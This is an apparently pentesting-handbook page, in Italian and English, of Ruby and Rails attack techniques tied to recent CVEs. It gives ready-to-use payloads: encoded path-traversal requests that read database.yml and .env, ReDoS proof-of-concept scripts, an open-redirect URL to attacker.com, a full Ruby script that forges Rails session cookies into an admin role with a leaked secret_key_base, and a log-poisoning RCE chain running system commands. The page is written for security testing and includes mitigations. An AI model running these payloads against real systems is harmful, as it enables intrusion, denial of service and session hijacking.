# Trucchi Ruby

{{#include ../../banners/hacktricks-training.md}}

## Caricamento file per RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.

Suggerimenti:
- Altri percorsi di boot/eager-load eseguiti all'avvio dell'app sono anch'essi rischiosi se scrivibili (es., `config/initializers/` è il classico). Se trovi un upload arbitrario che finisce da qualche parte sotto `config/` e viene poi valutato/required, potresti ottenere RCE all'avvio.
- Cerca build dev/staging che copiano file controllati dall'utente nell'immagine del container dove Rails li caricherà all'avvio.

## Active Storage image transformation → command execution (CVE-2025-24293)

When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- Cosa provare durante i test
- Individua qualsiasi endpoint che accetti opzioni di variant/processing, nomi di trasformazione o argomenti arbitrari per ImageMagick.
- Fuzz `params[:t]` e `params[:v]` per errori sospetti o effetti collaterali di esecuzione. Se puoi influenzare il nome del metodo o passare argomenti raw che raggiungono MiniMagick, potresti ottenere code exec sull'host che elabora le immagini.
- Se hai solo accesso in sola lettura alle variant generate, tenta l'exfiltrazione cieca tramite operazioni ImageMagick artigianali.

- Mitigazione/rilevamento
- Se vedi Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 con Active Storage + `image_processing` + `mini_magick` e trasformazioni controllate dall'utente, consideralo sfruttabile. Raccomanda l'aggiornamento e l'applicazione di allowlist rigorose per metodi/parametri e una policy di ImageMagick più rigida.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Se lo stack target usa il middleware Rack direttamente o tramite framework, le versioni di `rack` precedenti a 2.2.13, 3.0.14 e 3.1.12 consentono Local File Inclusion tramite `Rack::Static` quando `:root` non è impostato/mal configurato. Traversal codificato in `PATH_INFO` può esporre file sotto la working directory del processo o una root inattesa.

- Cerca applicazioni che montano `Rack::Static` in `config.ru` o nello stack di middleware. Prova traversal codificati contro i percorsi statici, per esempio:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Adatta il prefisso per corrispondere a `urls:` configurati. Se l'app risponde con il contenuto del file, probabilmente hai LFI verso qualsiasi cosa sotto il `:root` risolto.

- Mitigazione: aggiorna Rack; assicurati che `:root` punti solo a una directory di file pubblici ed sia impostato esplicitamente.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` e < `2.2.8.1` impiegava tempo super-lineare per parsare header `Content-Type: multipart/form-data` appositamente costruiti. Un singolo POST con una gigantesca lista di parametri `A=` può bloccare un worker Puma/Unicorn e causare DoS o starvation della coda di richieste.

- PoC rapido (bloccherà un worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Funziona contro qualsiasi stack basato su Rack (Rails/Sinatra/Hanami/Grape). Se frontato da nginx/haproxy con keep-alive, ripeti in parallelo per esaurire i worker.
- Corretto rendendo il parser lineare; cerca la gem `rack` versione < `3.0.9.1` o < `2.2.8.1`. Nelle valutazioni, segnala che le WAF raramente bloccano questo perché l'header è sintatticamente valido.

## REXML XML parser ReDoS (CVE-2024-49761)

La gem REXML < 3.3.9 (Ruby 3.1 e precedenti) effettua un backtracking catastrofico quando parsea riferimenti numerici esadecimali con lunghe sequenze di cifre (es., `&#1111111111111x41;`). Qualsiasi XML processato da REXML o da librerie che lo usano (client SOAP/XML API, SAML, upload SVG) può essere abusato per esaurire la CPU.

Trigger minimale contro un endpoint Rails che analizza XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Se il processo resta occupato per secondi e si verificano picchi di CPU del worker, è probabile che sia vulnerabile. L'attacco è low bandwidth e interessa anche i background jobs che ingestano XML.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Le app che usano la gem `cgi` (di default in molti stack Rack) possono andare in freeze con un singolo header malevolo:
- `CGI::Cookie.parse` era super-lineare; stringhe di cookie enormi (migliaia di delimitatori) scatenano comportamento O(N²).
- `CGI::Util#escapeElement` regex permetteva ReDoS sull'escaping HTML.

Entrambi i problemi sono stati risolti in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. Per i pentests, invia un enorme header `Cookie:` o fornisci HTML non attendibile a codice helper e osserva il lockup del worker. Combina con keep-alive per amplificare.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

La gem `googlesign_in` < 1.3.0 (usata per Google OAuth su Rails) effettuava un controllo same-origin incompleto sul parametro `proceedto`. Un URL malformato come `proceedto=//attacker.com/%2F..` bypassa il controllo e reindirizza l'utente off-site preservando i cookie flash/session di Rails.

Exploit flow:
1. La vittima clicca un link Google Sign-In creato dall'attaccante.
2. Dopo l'autenticazione, la gem reindirizza a un dominio controllato dall'attaccante, causando la leak di flash notices o di qualsiasi dato memorizzato in cookie con scope sul dominio wildcard.
3. Se l'app memorizza token a breve durata o magic links in flash, questo può essere convertito in account takeover.

Durante i test, fai grep su Gemfile.lock per `googlesign_in` < 1.3.0 e prova valori malformati di `proceedto`. Conferma tramite l'header Location e la riflessione dei cookie.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails encrypts and signs cookies using keys derived from `secret_key_base`. Se quel valore leaks (ad es., in un repo, nei log o in credenziali mal configurate), puoi solitamente decrypt, modify, and re-encrypt cookies. Questo spesso porta a authz bypass se l'app memorizza ruoli, user IDs o feature flags nei cookie.

Snippet Ruby minimo per decrypt and re-encrypt i cookie moderni (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Note:
- Le app più vecchie possono usare AES-256-CBC e salts `encrypted cookie` / `signed encrypted cookie`, o i serializer JSON/Marshal. Regola salts, cipher e serializer di conseguenza.
- In caso di compromissione o durante l'assessment, ruota `secret_key_base` per invalidare tutti i cookie esistenti.

## Vedi anche (vulnerabilità specifiche di Ruby/Rails)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

Quando un'app (spesso un semplice endpoint Rack/Sinatra/Rails) soddisfa entrambe le condizioni:
- registra una stringa controllata dall'utente parola per parola, e
- in seguito esegue un `load` di un file il cui percorso è derivato dalla stessa stringa (dopo `Pathname#cleanpath`),

Spesso è possibile ottenere RCE avvelenando il log e poi inducendo l'app a `load` il file di log. Primitive chiave:

- Ruby `load` valuta il contenuto del file target come Ruby indipendentemente dall'estensione del file. Qualsiasi file di testo leggibile il cui contenuto venga interpretato come Ruby verrà eseguito.
- `Pathname#cleanpath` collassa i segmenti `.` e `..` senza accedere al filesystem, abilitando il path smuggling: dati controllati dall'attaccante possono essere anteposti per il logging mentre il path pulito risolve ancora al file destinato all'esecuzione (es., `../logs/error.log`).

### Pattern vulnerabile minimo
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Perché il log può contenere codice Ruby valido
`Logger` scrive righe di prefisso come:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
In Ruby, `#` starts a comment and `9/2/2025` is just arithmetic. To inject valid Ruby code you need to:
- Begin your payload on a new line so it is not commented out by the `#` in the INFO line; send a leading newline (`\n` or `%0A`).
- Close the dangling `[` introduced by the INFO line. A common trick is to start with `]` and optionally make the parser happy with `][0]=1`.
- Then place arbitrary Ruby (e.g., `system(...)`).

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Infiltrare una singola stringa che contemporaneamente registra codice e si risolve nel percorso di log
Vogliamo una singola stringa controllata dall'attaccante che:
- quando registrata in forma raw, contenga il nostro payload Ruby, e
- quando passata attraverso `Pathname.new(<input>).cleanpath`, si risolva in `../logs/error.log` così che il successivo `load` esegua il file di log appena avvelenato.

`Pathname#cleanpath` ignora gli schemi e collassa i componenti di traversal, quindi il seguente funziona:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- Il `#` prima di `://` fa sì che Ruby ignori la parte finale quando il log viene eseguito, mentre `cleanpath` riduce comunque il suffisso a `../logs/error.log`.
- La newline iniziale interrompe la riga INFO; `]` chiude la parentesi quadra pendente; `][0]=1` soddisfa il parser.

### Sfruttamento end-to-end
1. Invia quanto segue come nome dello script di backup (codifica in URL la prima newline come `%0A` se necessario):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. L'app registra la tua stringa grezza in `logs/error.log`.
3. L'app calcola `cleanpath`, che risolve in `../logs/error.log`, e chiama `load` su di esso.
4. Ruby esegue il codice che hai iniettato nel log.

Per esfiltrare un file in un ambiente tipo CTF:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (il primo carattere è una nuova riga):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Riferimenti

- [Rails Security Announcement: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub Advisory: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath docs](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [How Ruby load works](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS advisory (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby security advisories for CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
